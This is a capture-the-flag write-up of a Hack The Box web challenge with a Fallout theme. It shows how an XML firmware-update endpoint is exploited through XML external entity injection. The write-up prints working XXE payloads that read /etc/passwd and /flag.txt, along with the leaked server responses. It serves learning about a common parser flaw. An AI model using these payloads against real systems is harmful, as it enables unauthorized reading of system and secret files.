# Jailbreak

**Event:** HTB Tryout 2026
**Category:** Web
**Difficulty:** Very Easy
**Target:** `http://<target-ip>:<port>/`
**Mentored via:** a custom fork of [0xdf](https://gitlab.com/0xdf/htb-ai-mentor/-/tree/main)'s Socratic HTB-mentoring skill

Jailbreak is a very easy web challenge built as a Fallout Pip-Boy themed interface ("PIP-OS"). The app exposes a firmware update feature that accepts an XML configuration file, which is parsed without disabling external entities — a classic XXE (XML External Entity) vulnerability that allows arbitrary local file read, leading straight to the flag.

## Enumeration

The app's navbar exposes six tabs: `STAT`, `INV` (`/inventory`), `DATA` (`/data`), `MAP` (`/map`), `RADIO` (`/radio`), and `ROM` (`/rom`). Most tabs (`STAT`, `INV`, `DATA`) are cosmetic/game-flavor pages with static placeholder content (character stats, weapons, quest logs) and no user input.

### ROM: Firmware Update

The `ROM` tab is the interesting one — it exposes a "Firmware Update" feature that accepts an XML configuration file:

```xml
<FirmwareUpdateConfig>
    <Firmware>
        <Version>1.33.7</Version>
        <ReleaseDate>2077-10-21</ReleaseDate>
        <Description>Update includes advanced biometric lock functionality for enhanced security.</Description>
        <Checksum type="SHA-256">9b74c9897bac770ffc029102a200c5de</Checksum>
    </Firmware>
    <Components>
        <Component name="navigation">...</Component>
        <Component name="communication">...</Component>
        <Component name="biometric_security">...</Component>
    </Components>
    <UpdateURL>https://satellite-updates.hackthebox.org/firmware/1.33.7/download</UpdateURL>
</FirmwareUpdateConfig>
```

Reading the page's client-side JS (`update.js`) showed exactly how this is submitted:

```js
const queueUpdate = async (xmlConfig) => {
    const response = await fetch("/api/update", {
        method: "POST",
        headers: { "Content-Type": "application/xml" },
        body: xmlConfig
    });
    return await response.json();
}

$("#updateBtn").on("click", async () => {
    const msg = await queueUpdate($("#configData").val());
    $("#messageText").text(msg.message);
});
```

Key takeaway: the XML is POSTed raw to `/api/update`, and the server responds with JSON: `{ "message": "..." }`, which is templated as `Firmware version <value> update initiated.` — i.e. the server reflects the `<Version>` field value directly back in the response. This became the feedback channel for confirming the XXE payload worked.

## XXE: Building a Working Payload

### Dead end: `<!DOCTYPE>` placed inside the document

First attempt inserted the `<!DOCTYPE>` declaration between existing child elements:

```xml
<Firmware>
    <Version>1.33.7</Version>
    <ReleaseDate>2077-10-21</ReleaseDate>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <Description>Update includes advanced biometric lock functionality for enhanced security.</Description>
    ...
```

Result: `An error occurred: StartTag: invalid element name, line 5, column 10`. A `DOCTYPE` must appear before the root element, not nested inside it — XML document order is: optional XML declaration → `DOCTYPE` → single root element.

### Dead end: entity defined but never referenced

After moving `DOCTYPE` above the root element, the entity `&xxe;` was defined but the original field text was left untouched — the parser had nothing to substitute. No effect.

### Dead end: wrong reflection point

`&xxe;` was placed inside `<Description>`:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<FirmwareUpdateConfig>
    <Firmware>
        <Version>1.33.7</Version>
        <ReleaseDate>2077-10-21</ReleaseDate>
        <Description>&xxe;</Description>
        ...
```

The submission succeeded with no parser error (`Firmware version 1.33.7 update initiated.`), confirming the entity resolved without breaking anything — but the description isn't rendered anywhere in the app (checked `/rom`, `/data`, `/inventory`, page `<title>`), so there was no visible confirmation yet.

## Finding the Reflection Point

Re-reading `update.js` showed `msg.message` is what actually gets displayed, and the original confirmation text embedded the **`Version`** field's value (`1.33.7`), not the description. Moving the entity reference there instead gave a direct, in-band feedback loop — no need for an out-of-band listener (also convenient since the target is internet-facing with no VPN/static IP available for callback-style testing).

## Confirmed XXE: Reading `/etc/passwd`

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<FirmwareUpdateConfig>
    <Firmware>
        <Version>&xxe;</Version>
        <ReleaseDate>2077-10-21</ReleaseDate>
        <Description>Update includes advanced biometric lock functionality for enhanced security.</Description>
        <Checksum type="SHA-256">9b74c9897bac770ffc029102a200c5de</Checksum>
    </Firmware>
    ...
</FirmwareUpdateConfig>
```

Response:

```text
Firmware version root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
...
nobody:x:65534:65534:nobody:/:/sbin/nologin
 update initiated.
```

Full arbitrary local file read confirmed via the `Version` field's reflection.

## Flag

The challenge scenario description states the flag is located at `/flag.txt`, so the entity target was pointed there directly:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
...
<Version>&xxe;</Version>
```

Response:

```text
Firmware version HTB{b1om3tric_l0cks_4nd_fl1cker1ng_l1ghts_...} update initiated.
```

**Flag:** `HTB{b1om3tric_l0cks_4nd_fl1cker1ng_l1ghts_...}` (hash suffix truncated)

## Lessons Learned

- `DOCTYPE` declarations must sit before the root element, not inline among child elements — an easy mistake when hand-editing an existing XML sample.
- Defining an external entity does nothing on its own; it must be referenced (`&name;`) somewhere in the document body to trigger substitution.
- Don't assume the first "plausible" field is the reflection point — trace the actual data flow (client JS, response body/JSON) rather than guessing from the UI. The fastest confirmation came from re-reading the response-handling code (`update.js`), not from clicking through app tabs.
- In-band XXE (reflected in a response) is faster to iterate on than blind/OOB XXE, and worth checking for first — especially useful when no public IP/domain is available to catch out-of-band callbacks.

## References

- [XXE (XML External Entity) Injection — PortSwigger Web Security Academy](https://portswigger.net/web-security/xxe)
